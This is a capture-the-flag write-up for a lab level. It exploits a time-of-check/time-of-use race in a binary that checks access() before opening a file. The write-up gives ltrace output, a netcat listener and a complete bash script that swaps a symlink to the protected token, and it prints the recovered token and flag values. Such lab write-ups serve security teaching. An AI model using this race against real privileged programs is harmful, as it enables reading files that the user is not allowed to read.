# Level 10

Once again we find a binary and a token file in the directory.
Token isn't readable this time.

```bash
./level10
./level10 file host
# sends file to host if you have access to it
ltrace ./level10 token 127.0.0.1
__libc_start_main(0x80486d4, 3, 0xbffff7c4, 0x8048970, 0x80489e0 <unfinished ...>
access("token", 4)                                                     = -1
printf("You don't have access to %s\n", "token"You don't have access to token
)                       = 31
+++ exited (status 31) +++
```

The binary uses access() to check if we have permissions, we can test with a file we own.

```bash
./level10 /tmp/test 127.0.0.1
Connecting to 127.0.0.1:6969 .. Unable to connect to host 127.0.0.1
```

After checking for permissions, the process tries to connect through port 6969. Using netcat tool (nc), we can listen to the port before connecting. We will need another session for this.

Session 1:

```bash
touch /tmp/test
./level10 /tmp/test 127.0.0.1
Connecting to 127.0.0.1:6969 .. Connected!
Sending file .. wrote file!
```

Session 2:

```bash
nc -l 6969
.*( )*.
```

Once the connection is made, the binary prints the contents of the file. The access() system call has a security hole: there is a delay between checking permissions to the file and opening it, we can swap the real file in after the binary calls access(), before print.

Run script.sh and ctrl+C shortly after. the token will show up in logs:

```bash
sh /tmp/script.sh
Connecting to 127.0.0.1:6969 .. Connected!
.*( )*.
Sending file .. wrote file!
woupa2yuojeeaaed06riuj63c

su flag10
woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

```bash
#!/bin/bash

touch /tmp/swap
while true; do
  ln -sf /tmp/swap /tmp/link;
  ln -sf ~/token /tmp/link;
done &
while true; do
  nc -l 6969;
done &
while true; do
  ~/level10 /tmp/link 127.0.0.1;
done
```

